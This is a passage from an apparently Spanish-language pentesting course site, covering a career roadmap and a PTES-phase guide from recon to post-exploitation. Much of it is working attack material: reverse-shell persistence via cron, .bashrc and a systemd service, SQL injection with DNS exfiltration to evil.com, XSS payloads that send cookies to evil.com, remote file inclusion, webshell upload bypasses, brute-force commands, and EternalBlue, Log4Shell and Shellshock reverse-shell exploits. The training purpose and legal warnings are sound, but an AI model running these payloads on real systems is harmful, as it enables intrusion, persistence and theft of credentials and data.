<pre><code class="language-bash"># PERSISTENCIA EN LINUX
# 1. Clave SSH autorizada
echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys
# 2. Cron reverso
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'") | crontab -
# 3. .bashrc
echo "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1' &" >> ~/.bashrc
# 4. Servicio systemd
cat > /etc/systemd/system/evil.service << EOF
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable evil.service

# MOVIMIENTO LATERAL
# 1. SSH dynamic port forwarding (pivoting)
ssh -D 1080 -f -N user@target
# 2. Chisel — túnel TCP
# En tu máquina: ./chisel server -p 8080 --reverse
# En target: ./chisel client TU_IP:8080 R:8888:localhost:8888
# 3. Ligolo-ng — VPN-like pivoting (más avanzado)
# 4. Metasploit route
route add 10.10.10.0/24 1
# 5. Proxychains
proxychains nmap -sT -Pn 10.10.10.10</code></pre>

<div class="guide-callout warning">⚠️ <strong>Importante:</strong> Toda esta fase debe practicarse exclusivamente en entornos autorizados: HackTheBox, TryHackMe, VulnHub, laboratorios propios. Hacerlo en sistemas reales sin permiso ES DELITO.</div>

<h3>🎓 FASE 5: Especialización (Meses 8-9, ≈60h)</h3>
<p>Elige tu camino según tus intereses. No puedes saberlo todo, pero sí ser excelente en algo.</p>

<h4>Camino A: Pentesting Generalista</h4>
<p>Para trabajar en consultoras, bug bounty, o como generalista.</p>
<ul>
<li>Certificaciones: eJPT (fácil, barato) → PNPT (práctico, ~$400) → OSCP (el estándar, ~$1,500)</li>
<li>Habilidades clave: Web, redes, Active Directory, report writing</li>
<li>Práctica: 50+ máquinas HTB, todos los laboratorios PortSwigger</li>
</ul>

<h4>Camino B: Red Team / Adversary Simulation</h4>
<p>Para emular ataques avanzados. El escalón más alto del pentesting.</p>
<ul>
<li>Certificaciones: OSCP → OSEP (evasión de defensas) → CRTO (Cobalt Strike) → RTO</li>
<li>Habilidades: C/C++/C#, evasión EDR, C2 frameworks, malware development</li>
<li>Práctica: RastaLabs, VHL, laboratorios propios de AD</li>
</ul>

<h4>Camino C: Blue Team / SOC / DFIR</h4>
<p>Para defender, detectar y responder.</p>
<ul>
<li>Certificaciones: Security+ → CySA+ → GCFA (SANS) → CISSP</li>
<li>Habilidades: SIEM (Splunk, ELK), EDR, threat hunting, forense</li>
<li>Práctica: Blue Team Labs Online, CyberDefenders, letsdefend.io</li>
</ul>

<h4>Camino D: Cloud Security</h4>
<p>La nube no para de crecer. Especialización muy demandada.</p>
<ul>
<li>Certificaciones: AWS Security Specialty → CCSP → AZ-500</li>
<li>Habilidades: AWS/Azure/GCP, Terraform, Kubernetes, DevSecOps</li>
<li>Práctica: Flaws.cloud, CloudGoat, TerraGoat, AWS Security Workshops</li>
</ul>

<h4>Camino E: Bug Bounty Hunter</h4>
<p>Cazar vulnerabilidades por dinero en programas públicos.</p>
<ul>
<li>Plataformas: HackerOne, Bugcrowd, Intigriti, YesWeHack</li>
<li>Habilidades: Web, mobile, recon avanzado, creatividad, persistencia</li>
<li>Ingresos: $0 → $100k+/año (top 1%), el 80% gana menos de $5k/año</li>
<li>Clave: Especializarse en un tipo de bug (IDOR, SSRF, SSTI) y ser el mejor</li>
</ul>

<h3>📝 FASE 6: Report Writing y Portfolio (Mes 10, ≈30h)</h3>

<h4>6.1 El reporte de pentesting</h4>
<p>El reporte es lo único que ve el cliente. Un pentest sin reporte no existe.</p>
<pre><code class="language-text">ESTRUCTURA DE UN REPORTE PROFESIONAL

1. PORTADA
   - Título, cliente, fecha, clasificación (CONFIDENCIAL)
   - Nombre del pentester, contacto

2. RESUMEN EJECUTIVO (1 página, lenguaje NO técnico)
   - Qué se hizo, cuándo, alcance
   - Hallazgos críticos en lenguaje de negocio ("riesgo de pérdida de datos")
   - Estadísticas: total hallazgos por severidad

3. HALLAZGOS CRÍTICOS (top 3-5)
   - Los que requieren atención inmediata

4. METODOLOGÍA
   - Herramientas usadas, fases del pentest

5. HALLAZGOS DETALLADOS (por severidad)
   Cada hallazgo debe incluir:
   - ID, título, severidad (CVSS v3.1)
   - Descripción técnica
   - Pasos para reproducir (con comandos y capturas)
   - Impacto potencial
   - Remedación (cómo arreglarlo)
   - Referencias (CVE, CWE, OWASP)

6. RECOMENDACIONES
   - Priorizadas por impacto
   - Quick wins vs largo plazo

7. ANEXOS
   - Comandos usados, logs relevantes, capturas de pantalla</code></pre>

<h4>6.2 Portfolio profesional</h4>
<ul>
<li><strong>GitHub:</strong> Writeups de máquinas HTB/THM, scripts propios, herramientas, CTFs</li>
<li><strong>Blog personal:</strong> Escribe sobre lo que aprendes. Mejora tu marca personal.</li>
<li><strong>LinkedIn:</strong> Perfil optimizado con keywords del sector. Publica contenido técnico.</li>
<li><strong>CV:</strong> No pongas "conocimientos de", pon logros concretos: "Encontré 5 SQLi críticos en programa X"</li>
</ul>

<div class="guide-callout tip">💡 <strong>Ejemplo de entrada de portfolio:</strong> "Realicé pentest a aplicación web (alcance: 10 endpoints, 2 semanas). Encontré: SQLi (CVSS 9.8), IDOR (7.5), XSS almacenado (6.1). Reporté con PoC y remediación. Cliente: XYZ Corp."</div>

<h3>🚀 FASE 7: Búsqueda de Trabajo (Mes 11, ≈20h)</h3>
<ul>
<li><strong>Plataformas:</strong> LinkedIn, InfoJobs, Indeed, Glassdoor</li>
<li><strong>Keywords en CV:</strong> Pentesting, OWASP Top 10, Burp Suite, Metasploit, SIEM, Python, Linux, Red Team, Blue Team</li>
<li><strong>Empresas en España:</strong> Telefónica Tech, Indra, S2 Grupo, GMV, Deloitte, KPMG, PwC, Accenture, Tarlogic, Innotec</li>
<li><strong>Entrevistas técnicas:</strong> Prepárate para preguntas sobre OWASP Top 10, cómo harías un pentest, explotación de AD, experiencia con herramientas</li>
<li><strong>Salarios entrada España 2025:</strong> SOC L1 €22-28k, Pentester Jr €25-35k, Cloud Security Jr €30-40k</li>
</ul>

<h3>📚 FASE 8: Recursos y Aprendizaje Continuo (Mes 12+)</h3>
<p>La ciberseguridad cambia cada 6 meses. El aprendizaje NUNCA termina.</p>

<h4>Recursos gratuitos</h4>
<ul>
<li><strong>PortSwigger Web Security Academy</strong> — el mejor recurso para web</li>
<li><strong>TryHackMe</strong> — paths guiados para principiantes</li>
<li><strong>HackTheBox Academy</strong> — cursos estructurados (parte gratuita)</li>
<li><strong>PicoCTF</strong> — CTF para aprender</li>
<li><strong>OverTheWire</strong> — wargames de Linux, crypto, natas</li>
<li><strong>VulnHub</strong> — máquinas vulnerables para descargar</li>
<li><strong>DefendTheWeb</strong> — laboratorios interactivos de seguridad web</li>
</ul>

<h4>Libros recomendados</h4>
<ul>
<li>"The Web Application Hacker's Handbook" — Dafydd Stuttard (creador de Burp)</li>
<li>"Penetration Testing: A Hands-On Introduction" — Georgia Weidman</li>
<li>"The Hacker Playbook 3" — Peter Kim</li>
<li>"Red Team Field Manual" — Ben Clark</li>
<li>"Practical Malware Analysis" — Michael Sikorski</li>
<li>"Blue Team Handbook" — Don Murdoch</li>
</ul>

<h4>Canales de YouTube</h4>
<ul>
<li><strong>IppSec</strong> — walkthroughs de HTB, el mejor</li>
<li><strong>John Hammond</strong> — malware, CTFs, educación</li>
<li><strong>The Cyber Mentor</strong> — cursos completos (Practical Ethical Hacking)</li>
<li><strong>NetworkChuck</strong> — introducciones entretenidas</li>
<li><strong>STÖK</strong> — bug bounty, web hacking</li>
<li><strong>InsiderPhd</strong> — writeups de HTB explicados</li>
<li><strong>HackerSploit</strong> — pentesting, seguridad ofensiva</li>
</ul>

<h4>Comunidades</h4>
<ul>
<li><strong>Discord:</strong> The Cyber Mentor, InfoSec Community, HackTheBox</li>
<li><strong>Reddit:</strong> r/netsec, r/AskNetsec, r/cybersecurity, r/HowToHack</li>
<li><strong>Twitter/X:</strong> Sigue a profesionales, no solo a "influencers"</li>
</ul>

<div class="guide-callout goal"><strong>🎯 Objetivo cumplido:</strong> Has completado el roadmap de 12 meses. Ahora eres capaz de realizar un pentest completo de principio a fin, escribir informes profesionales, tienes un portfolio en GitHub y estás preparado para tu primer trabajo en ciberseguridad. El viaje no termina aquí — la ciberseguridad es una carrera de aprendizaje continuo. ¡Bienvenido!</div>
</div>`
    },
    {
      id: "pentesting-fases",
      title: "Fases del Pentesting — Guía Definitiva",
      subtitle: "Metodología completa con 100+ comandos",
      emoji: "🔍", category: "tecnicas", level: "Intermedio",
      elements: 200, estimatedReadTime: 50,
      tags: ["pentesting", "metodologia", "fases", "reporte", "PTES", "OSCP"],
      linkedArticles: [],
      description: "Cada fase de un pentest profesional explicada en detalle siguiendo el estándar PTES. Pre-engagement, reconocimiento, escaneo, explotación, post-explotación y reporte. 100+ comandos, ejemplos reales y herramientas.",
      content: `<div class="guide-content">
<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Dominar cada fase de un pentest profesional siguiendo el estándar PTES (Penetration Testing Execution Standard). Desde el contrato inicial hasta la entrega del reporte, con comandos exactos, herramientas y ejemplos de cada fase.</div>

<h3>📋 FASE 0: Pre-Engagement — El contrato</h3>
<p><strong>Sin un contrato firmado, lo que haces es DELITO.</strong> Esta fase es la más importante legalmente. Nunca la saltes.</p>

<h4>Documentos necesarios</h4>
<ol>
<li><strong>Acuerdo de Alcance (Scope):</strong> Define EXACTAMENTE qué IPs, dominios, aplicaciones y sistemas están autorizados</li>
<li><strong>NDA (Non-Disclosure Agreement):</strong> Confidencialidad mutua sobre datos encontrados</li>
<li><strong>Reglas de Engagement (RoE):</strong> Horarios, métodos prohibidos, notificación de críticos</li>
<li><strong>Autorización por escrito:</strong> Firmada por alguien con autoridad real en la organización</li>
<li><strong>Seguro de responsabilidad:</strong> Professional indemnity insurance</li>
</ol>

<h4>Template de scope</h4>
<pre><code class="language-text">PENETRATION TEST SCOPE DOCUMENT
===============================
Cliente: ACME Corp
Fecha: 2025-07-01 a 2025-07-15

IN-SCOPE:
  - web.acmecorp.com (production)
  - api.acmecorp.com (production)
  - mail.acmecorp.com (production)
  - 10.10.10.0/24 (internal network)

OUT-OF-SCOPE:
  - *.payments.acmecorp.com (critical payment system)
  - *.hr.acmecorp.com (HR system with PII)
  - Any system not explicitly listed above

METHODS ALLOWED:
  - Automated scanning (nmap, nessus)
  - Manual web application testing
  - Social engineering simulation (email only, no physical)

METHODS PROHIBITED:
  - Denial of Service attacks
  - Physical security testing
  - Social engineering against non-consenting employees

EMERGENCY CONTACTS:
  - IT Security: john@acmecorp.com / +34 600 000 000
  - CISO: jane@acmecorp.com / +34 600 000 001

REPORTING:
  - Critical findings: within 4 hours
  - All findings: within 48 hours
  - Final report: within 5 business days of completion</code></pre>

<h4>Checklist pre-engagement</h4>
<ul>
<li>☐ Contrato firmado por ambas partes</li>
<li>☐ NDA firmado</li>
<li>☐ Alcance definido y acordado</li>
<li>☐ Reglas de engagement documentadas</li>
<li>☐ Contactos de emergencia confirmados</li>
<li>☐ Métodos de comunicación acordados (email cifrado, Signal)</li>
<li>☐ Herramientas aprobadas</li>
<li>☐ Fechas y horarios acordados</li>
<li>☐ Entorno de pruebas si aplica (staging vs production)</li>
<li>☐ Datos de acceso proporcionados (VPN, jumpbox, credenciales)</li>
</ul>

<div class="guide-callout warning">⚠️ <strong>Regla de oro:</strong> Si no tienes UN PAPEL FIRMADO que diga explícitamente "puedes atacar este sistema", no lo hagas. Da igual que el CISO te haya dicho que sí por teléfono. En un juicio, el papel es lo único que vale.</div>

<h3>🔎 FASE 1: Reconocimiento (Recon) — 40% del éxito</h3>
<p>El reconocimiento es la fase más infravalorada. Un buen pentester pasa el 40% de su tiempo aquí. Cada pieza de información que encuentres es un posible vector de ataque.</p>

<h4>1.1 Reconocimiento Pasivo (sin tocar el objetivo)</h4>

<h5>WHOIS y registro de dominios</h5>
<pre><code class="language-bash"># WHOIS del dominio
whois example.com
# Buscar dominios similares (typosquatting)
# DNSTwist
dnstwist example.com
# Información de registro histórica
# whois.domaintools.com (histórico de WHOIS)</code></pre>

<h5>DNS Enumeration</h5>
<pre><code class="language-bash"># Registros DNS básicos
dig example.com ANY +short
dig example.com A +short        # IPv4
dig example.com AAAA +short     # IPv6
dig example.com MX +short       # servidores de correo
dig example.com NS +short       # nameservers
dig example.com TXT +short      # registros TXT (SPF, DKIM, DMARC)
dig example.com CNAME +short    # alias

# Transferencia de zona (casi siempre denegada, pero inténtalo)
dig axfr @ns1.example.com example.com

# dnsrecon — enumeración completa
dnsrecon -d example.com -t std
dnsrecon -d example.com -t brt -D subdomains-1000.txt

# DNS brute force
dnsenum example.com
dnsmap example.com

# Reverse DNS lookup
dig -x 8.8.8.8</code></pre>

<h5>Certificate Transparency</h5>
<pre><code class="language-bash"># crt.sh — todos los certificados emitidos para un dominio
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
# Con python
# pip install certipy
certipy example.com</code></pre>

<h5>Wayback Machine — contenido histórico</h5>
<pre><code class="language-bash"># Ver snapshots históricos del sitio
curl "https://web.archive.org/cdx/search/cdx?url=*.example.com&output=json"
# Buscar archivos olvidados en versiones antiguas
# Ejemplo: /admin, /backup, /config que ya no existen pero antes sí</code></pre>

<h5>Google Dorking avanzado</h5>
<pre><code class="language-text"># COMBINACIONES PODEROSAS
site:example.com intitle:"index of" "backup"
site:example.com inurl:admin intitle:login
site:example.com ext:sql "INSERT INTO" "password"
site:example.com ext:log "password" "user"
site:example.com "Fatal error" "Stack trace"
site:example.com inurl:phpMyAdmin "Welcome to phpMyAdmin"
site:example.com intitle:"Apache Status" "Server Version"
site:example.com intext:"powered by" AND inurl:wp-content
site:github.com "example.com" "api_key"
site:pastebin.com "example.com"
filetype:pdf site:example.com AND intext:password</code></pre>

<h5>Shodan — búsqueda avanzada</h5>
<pre><code class="language-bash"># Filtros útiles
shodan search 'org:"Example Corp"'
shodan search 'net:203.0.113.0/24'
shodan search 'ssl.cert.subject.CN:"example.com"'
shodan search 'http.title:"Login" port:443 country:ES'
shodan search 'product:Apache after:2024-01-01'

# Obtener información de un host
shodan host 203.0.113.1

# Descargar resultados
shodan download resultados 'org:"Example Corp"'
shodan parse --fields ip_str,port,org resultados.json.gz</code></pre>

<h5>Redes sociales y empleados</h5>
<pre><code class="language-bash"># LinkedIn — buscar empleados de la organización
# Manual: linkedin.com/company/exampleco/people/
# theHarvester para recolección
theHarvester -d example.com -b linkedin

# Sherlock — buscar username en redes
sherlock username

# Maigret — más preciso
maigret username --all --no-recursive</code></pre>

<h5>GitHub — credenciales filtradas</h5>
<pre><code class="language-bash"># GitHub Dorking
# search: "example.com" password
# search: "example.com" api_key
# search: "example.com" SECRET_KEY
# search: "example.com" "-----BEGIN RSA PRIVATE KEY-----"
# search: "example.com" .env

# TruffleHog — buscar secrets automáticamente
trufflehog github --org=example-org --token=GITHUB_TOKEN

# GitLeaks
gitleaks detect --source /ruta/repo -v</code></pre>

<h4>1.2 Reconocimiento Activo</h4>

<h5>Nmap — El rey del escaneo</h5>
<pre><code class="language-bash"># FASES DE NMAP
# 1. Host discovery
nmap -sn 10.10.10.0/24                    # ping sweep (ICMP+TCP+ARP)
nmap -Pn target                           # saltar ping (si bloquea ICMP)
nmap -PS80,443 target                     # TCP SYN ping a puertos específicos

# 2. Port scanning
nmap -p- target                           # TODOS los puertos (65535) — lento pero completo
nmap --top-ports 1000 target              # top 1000 puertos
nmap -p 1-10000 target                    # rango personalizado
nmap -sS target                           # SYN scan (sigiloso, necesita root)
nmap -sT target                           # TCP connect scan (no necesita root)
nmap -sU --top-ports 100 target           # UDP scan (MUY lento)

# 3. Service detection
nmap -sV target                           # versiones de servicios
nmap -sV --version-intensity 9 target     # más agresivo en detección

# 4. OS detection
nmap -O target                            # sistema operativo

# 5. Scripts NSE (Nmap Scripting Engine)
nmap --script default target              # scripts por defecto
nmap --script vuln target                 # vulnerabilidades conocidas
nmap --script safe target                 # scripts seguros
nmap --script http-enum target            # enumeración web
nmap --script smb-vuln* target            # SMB vulnerabilities
nmap --script dns-brute target            # brute force subdominios

# COMBINACIONES PODEROSAS
# Completo pero lento (útil para pocos targets)
nmap -sC -sV -O -p- --min-rate 1000 -oA full target

# Rápido (útil para muchos targets)
nmap -sC -sV -p 22,80,443,8080 --min-rate 5000 -T4 -oA fast target

# Sigiloso (evitar IDS/IPS)
nmap -sS -T2 --source-port 53 --data-length 50 -f target

# Escaneo de red interna completa
nmap -sn 10.10.10.0/24 -oG hosts.txt
cat hosts.txt | grep Up | cut -d' ' -f2 > ips.txt
nmap -sC -sV -iL ips.txt -oA network_scan</code></pre>

<h5>Masscan — El hermano rápido de Nmap</h5>
<pre><code class="language-bash"># Escanea 100,000+ IPs en minutos
masscan -p1-65535 --rate=1000 target
masscan -p80,443 10.0.0.0/8 --rate=10000
masscan -p22,445,3389 --rate=5000 --output-format json -oM resultados.json 192.168.0.0/16</code></pre>

<h5>Enumeración de servicios comunes</h5>
<pre><code class="language-bash"># FTP (21)
nmap -p21 --script ftp-anon,ftp-bounce target
ftp target  # anonymous:anonymous

# SSH (22)
nmap -p22 --script ssh2-enum-algos,ssh-hostkey target
ssh-keyscan -t rsa target

# SMTP (25, 587)
nmap -p25 --script smtp-commands,smtp-enum-users target
# VRFY, EXPN, RCPT TO para enumerar usuarios
telnet target 25
VRFY root
EXPN admin
RCPT TO:user@target.com

# SMB (139, 445)
nmap -p445 --script smb-enum-shares,smb-os-discovery,smb-vuln* target
smbclient -L //target/ -N
enum4linux -a target
crackmapexec smb target --shares
smbmap -H target

# SNMP (161, UDP)
nmap -sU -p161 --script snmp-info,snmp-brute target
snmpwalk -v2c -c public target
onesixtyone -c community.txt target

# LDAP (389, 636)
nmap -p389 --script ldap-search,ldap-brute target
ldapsearch -H ldap://target -x -b "dc=example,dc=com"

# SQL Server (1433)
nmap -p1433 --script ms-sql-info,ms-sql-empty-password target

# MySQL (3306)
nmap -p3306 --script mysql-empty-password,mysql-enum target
mysql -h target -u root -p

# RDP (3389)
nmap -p3389 --script rdp-sec-check,rdp-vuln-ms12-020 target

# Redis (6379)
nmap -p6379 --script redis-info target
redis-cli -h target info
redis-cli -h target CONFIG GET requirepass

# MongoDB (27017)
nmap -p27017 --script mongodb-databases,mongodb-info target</code></pre>

<div class="guide-callout tip">💡 <strong>Flujo de reconocimiento eficiente:</strong> 1) Enumeración pasiva (dominos, subdominios, emails) → 2) Escaneo de puertos (nmap/masscan) → 3) Enumeración de servicios → 4) Análisis de tecnologías → 5) Documentar TODO. No pases a explotación hasta que tengas una imagen completa del objetivo.</div>

<h3>📡 FASE 2: Escaneo y Enumeración (Vulnerability Assessment)</h3>
<p>Ahora que sabes qué puertos están abiertos, profundiza en cada servicio para encontrar versiones exactas, configuraciones y debilidades.</p>

<h4>2.1 Fingerprinting de tecnologías web</h4>
<pre><code class="language-bash"># WhatWeb — identifica CMS, frameworks, librerías
whatweb https://target.com -v --log-verbose whatweb_results.txt

# Wappalyzer (extensión browser o CLI con wappalyzer cli)
wappalyzer https://target.com

# BuiltWith — tecnología y estructura del sitio (web)
# https://builtwith.com/target.com

# Detectar WAF (Web Application Firewall)
wafw00f https://target.com</code></pre>

<h4>2.2 Escáneres de vulnerabilidades automáticos</h4>
<pre><code class="language-bash"># Nikto — escáner web rápido
nikto -h https://target.com -ssl -o nikto_results.html

# Nuclei — escáner basado en templates (YAML)
nuclei -u https://target.com -t cves/ -o nuclei_results.txt
nuclei -u https://target.com -t vulnerabilities/
nuclei -l urls.txt -t ~/nuclei-templates/ -severity critical,high

# WPScan — si es WordPress
wpscan --url https://target.com --enumerate u,vp,vt --api-token API_KEY

# JoomScan — si es Joomla
joomscan -u https://target.com

# Droopescan — Drupal, SilverStripe, WordPress
droopescan scan drupal -u https://target.com</code></pre>

<h4>2.3 Enumeración de directorios y archivos</h4>
<pre><code class="language-bash"># Gobuster
gobuster dir -u https://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -x php,html,txt,asp,aspx,jsp,zip,tar.gz -o dirs.txt

# FFUF — más rápido
ffuf -u https://target.com/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 100 -c -e .php,.html,.txt -o ffuf_results.json

# Dirsearch — enfocado en descubrimiento
dirsearch -u https://target.com -e php,asp,js,txt -t 50

# Encontrar archivos de backup
# extensiones comunes: .bak, .old, .backup, .swp, ~, .save
ffuf -u https://target.com/FUZZ \
  -w backup_files.txt -t 50

# Enumerar parámetros GET/POST
# Arjun
arjun -u https://target.com/api/endpoint</code></pre>

<h4>2.4 Enumeración de parámetros y endpoints</h4>
<pre><code class="language-bash"># Katana — descubrimiento de endpoints
katana -u https://target.com -d 3 -o endpoints.txt

# Waybackurls — URLs del Wayback Machine
waybackurls target.com | sort -u > wayback_urls.txt

# Gau (GetAllUrls) — URLs de múltiples fuentes
gau target.com | sort -u > all_urls.txt

# ParamSpider — descubre parámetros
paramspider -d target.com -o params.txt</code></pre>

<h4>2.5 Fuzzing de parámetros</h4>
<pre><code class="language-bash"># FFUF para fuzzing de parámetros
ffuf -u https://target.com/page?FUZZ=test \
  -w params.txt -t 50

# Fuzzing de valores
ffuf -u https://target.com/page?id=FUZZ \
  -w ids.txt -t 50 -fc 404

# Fuzzing de cabeceras
ffuf -u https://target.com \
  -w headers.txt -H "FUZZ: test" -t 50</code></pre>

<div class="guide-callout tip">💡 <strong>Hito FASE 2:</strong> Tienes un mapa completo del objetivo: puertos abiertos, servicios con versiones, tecnologías web, directorios, endpoints potenciales y una lista de vulnerabilidades candidatas. Has documentado todo en un formato reproducible.</div>

<h3>💥 FASE 3: Explotación — Conseguir acceso</h3>
<p>Aquí conviertes las vulnerabilidades identificadas en acceso real al sistema. Esta fase requiere precisión, metodología y un plan B si algo falla.</p>

<h4>3.1 Explotación Web</h4>

<h5>SQL Injection (SQLi)</h5>
<pre><code class="language-sql"># TÉCNICAS DE SQLi

# 1. Error-based (extraer datos mediante errores)
' OR 1=1 --
' OR '1'='1' --
admin' --
admin' --
' UNION SELECT 1,2,3 --
' UNION SELECT 1,@@version,3 --

# 2. Blind SQLi (Boolean-based)
' AND 1=1 --     # verdadero
' AND 1=2 --     # falso

# 3. Blind SQLi (Time-based)
' OR IF(1=1,SLEEP(5),0) --   # MySQL
'; WAITFOR DELAY '00:00:05' --   # MSSQL
' OR pg_sleep(5) --           # PostgreSQL

# 4. Out-of-band (DNS exfiltration)
' EXEC master.dbo.xp_dirtree '\\evil.com\file' --  # MSSQL DNS exfil
LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.evil.com\\test'))

# EXTRACTING DATA
' UNION SELECT group_concat(table_name) FROM information_schema.tables --
' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT group_concat(username,':',password) FROM users --</code></pre>

<pre><code class="language-bash"># SQLMap — automatización (PERO primero aprende manual)
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --columns
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
sqlmap -u "https://target.com/page?id=1" --os-shell  # shell si es posible
sqlmap -r request.txt --batch  # desde archivo de petición

# Bypass WAF
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment
sqlmap -u "https://target.com/page?id=1" --tamper=between,randomcase
sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3</code></pre>

<h5>Cross-Site Scripting (XSS)</h5>
<pre><code class="language-html"><!-- TIPOS DE XSS -->

<!-- 1. Reflected XSS — el payload está en la URL/respuesta -->
&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;img src=x onerror=alert('XSS')&gt;
&lt;svg onload=alert('XSS')&gt;

<!-- 2. Stored XSS — el payload se guarda en el servidor -->
<!-- Comentarios, perfiles, foros -->
&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;
&lt;script&gt;new Image().src='https://evil.com/steal?c='+document.cookie&lt;/script&gt;

<!-- 3. DOM-based XSS — el payload se ejecuta en el DOM del cliente -->
#javascript:alert('XSS')
" onmouseover="alert('XSS')

<!-- BYPASSES -->
&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;           # bypass filtro case-sensitive
&lt;img src=x onerror=alert('XSS')&gt;         # sin usar script
&lt;body onload=alert('XSS')&gt;               # event handlers
jav&#x61;script:alert('XSS')               # HTML encoding
%3Cscript%3Ealert('XSS')%3C/script%3E     # URL encoding
&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;  # fromCharCode</code></pre>

<h5>File Inclusion (LFI/RFI)</h5>
<pre><code class="language-bash"># Local File Inclusion
curl "https://target.com/page?file=../../etc/passwd"
curl "https://target.com/page?file=../../../../etc/shadow"
curl "https://target.com/page?file=../../../proc/self/environ"
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# Remote File Inclusion
curl "https://target.com/page?file=https://evil.com/shell.txt"
curl "https://target.com/page?file=data://text/plain,<?php system('id');?>"

# Log Poisoning (escribir PHP en logs de Apache via User-Agent, luego incluirlos)
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com
curl "https://target.com/page?file=../../var/log/apache2/access.log&cmd=id"</code></pre>

<h5>File Upload vulnerabilities</h5>
<pre><code class="language-bash"># Subir webshell
# 1. Intenta subir archivo .php
# 2. Si bloquea .php, prueba:
shell.php5
shell.phtml
shell.php.jpg
shell.php%00.jpg      # null byte injection
shell.php;.jpg
shell.php.             # Windows quita el punto final
shell.asp
shell.aspx
shell.jsp

# 3. Si valida contenido, manipula magic bytes:
GIF89a<?php system($_GET['cmd']); ?>
# 4. Subir .htaccess malicioso
# AddType application/x-httpd-php .jpg
# Luego subir shell.jpg que será ejecutado como PHP</code></pre>

<h5>Server-Side Request Forgery (SSRF)</h5>
<pre><code class="language-bash"># Técnicas SSRF

# 1. Acceder a metadata cloud
# AWS
curl "http://169.254.169.254/latest/meta-data/"
curl "http://169.254.169.254/latest/user-data/"
# Azure
curl "http://169.254.169.254/metadata/identity/oauth2/token"
# GCP
curl "http://metadata.google.internal/computeMetadata/v1/"

# 2. Acceder a servicios internos
curl "http://localhost:22/"
curl "http://localhost:6379/"    # Redis
curl "http://localhost:9200/"    # Elasticsearch
curl "http://127.0.0.1:27017/"  # MongoDB

# 3. Bypass de restricciones
# Usar IPv6
curl "http://[::1]:22/"
# DNS rebinding
curl "http://1e100.net:80/"     # 1e100.net -> google
# Redirect HTTP
curl "http://target.com/redirect?url=http://169.254.169.254/"
# Usar otros protocolos (si soporta)
curl "file:///etc/passwd"
curl "dict://localhost:6379/info"</code></pre>

<h4>3.2 Explotación de Servicios</h4>

<h5>Fuerza Bruta de Credenciales</h5>
<pre><code class="language-bash"># Hydra — multi-protocolo
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
hydra -L users.txt -P passwords.txt ftp://target
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
hydra -l admin -P passwords.txt smb://target
hydra -L emails.txt -P passwords.txt target smtp -V

# Medusa — alternativa a Hydra
medusa -h target -u admin -P passwords.txt -M ssh

# Crowbar — fuerza bruta SSH con clave privada
crowbar -b sshkey -s target/ -k private.key

# Patator — más flexible pero menos conocido
patator ssh_login host=target user=admin password=FILE0 0=passwords.txt</code></pre>

<h5>Metasploit — Explotación automatizada</h5>
<pre><code class="language-bash"># Búsqueda de exploits
msfconsole -q
search eternalblue
search type:exploit platform:windows cve:2021
search apache log4j

# Explotación manual
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tu_ip
set LPORT 4444
check               # ¿es vulnerable?
exploit             # ejecutar

# Resource scripts (automatización)
cat exploit.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tu_ip
set LPORT 4444
run

# Ejecutar script
msfconsole -q -r exploit.rc</code></pre>

<h5>Explotación manual de servicios</h5>
<pre><code class="language-bash"># EternalBlue (MS17-010) — SMB
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
python eternalblue_exploit7.py target shellcode.bin

# BlueKeep (CVE-2019-0708) — RDP
# https://github.com/n1xbyte/CVE-2019-0708

# Log4Shell (CVE-2021-44228) — Log4j
curl -H 'User-Agent: \${jndi:ldap://tu_ip:1389/exploit}' https://target.com
# JNDIExploit
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i tu_ip -p 8888
curl -H 'User-Agent: \${jndi:ldap://tu_ip:1389/Basic/ReverseShell/tu_ip/4444}' ...

# Shellshock (CVE-2014-6271) — Bash
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" \
  http://target/cgi-bin/test.cgi</code></pre>

<div class="guide-callout tip">💡 <strong>Hito FASE 3:</strong> Has conseguido acceso inicial a un sistema. Tienes una shell (Meterpreter, reverse shell, o webshell). Documenta exactamente qué vulnerabilidad explotaste y cómo.</div>

<h3>⬆️ FASE 4: Post-Explotación — Escalar y persistir</h3>
<p>Ya tienes acceso. Ahora toca escalar privilegios, mantener el acceso y moverte lateralmente.</p>

<h4>4.1 Escalado de Privilegios Linux</h4>
<pre><code class="language-bash"># ============ ENUMERACIÓN AUTOMÁTICA ============
# LinPEAS (el mejor)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# LinEnum
./LinEnum.sh

# Linux Exploit Suggester 2
